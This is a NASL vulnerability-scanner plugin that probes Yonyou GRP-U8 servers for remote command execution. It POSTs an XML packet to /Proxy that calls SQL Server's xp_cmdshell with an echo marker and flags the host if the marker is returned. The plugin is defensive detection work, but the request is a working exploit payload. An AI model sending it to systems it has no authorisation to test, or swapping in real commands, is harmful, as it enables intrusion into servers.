############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if (description)
{
  script_id(51799286);
  script_version("1.3");
  script_name(english:"yongyou_u8_rce");
  script_summary(english:"yongyou_u8_rce");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"yongyou_u8_rce");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80, 443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell%20"echo T^est_F^or_Y^ongyo^u_GR^P-U8_RCE"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>';

function check_vuln(port){
		url = "/Proxy";
		req = http_send_recv3(method: "POST", port: port, data:data, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
		if("200 O">< req[0] && "Test_For_Yongyou_GRP-U8_RCE" >< req[2]){
		if (report_verbosity > 0) security_hole(port:port, extra:req[2]);
			else security_hole(port);
			}
}

function check_vuln_ssl(port){
        res = http_post(item:"/Proxy", port:port, data:data);
		ssl_req = https_req_get(port:port , request:res);
		if("200 O"><ssl_req && "Test_For_Yongyou_GRP-U8_RCE" >< ssl_req){
			if (report_verbosity > 0) security_hole(port:port, extra:ssl_req);
			else security_hole(port);
			}
}
##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
